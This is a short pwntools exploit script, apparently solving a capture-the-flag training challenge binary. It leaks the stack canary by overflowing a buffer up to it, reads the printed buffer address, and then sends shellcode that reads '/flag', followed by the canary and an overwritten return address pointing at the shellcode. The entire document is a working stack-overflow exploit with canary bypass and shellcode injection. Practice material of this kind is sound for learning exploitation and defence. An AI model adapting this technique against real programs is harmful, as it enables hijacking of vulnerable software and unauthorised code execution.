#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-3-0')
io = elf.process()

# From ghidra, il buffer ha offset 0x48 = d72
buff_offset = int("48", 16)
c_offset = buff_offset - 16

k = b"REPEAT"
p1 = k + b'A'*(c_offset - len(k) + 1)

# First round
io.sendline(f"{len(p1)}")
io.sendline(p1)

io.recvuntil(p1)
can_val = io.recvuntil("\n")
can_val = b"\x00" + can_val[:7]

# Buffer starting point
io.recvuntil(b"The input buffer begins at 0x")
buff_addr = p64(int(io.recvuntil(b',').decode()[:-1],16))

sc = asm(shellcraft.cat("/flag"))

p2 = sc + b'A'*(c_offset - len(sc)) + can_val + b'B'*8 + buff_addr

io.sendline(f"{len(p2)}")
io.sendline(p2)

io.interactive()
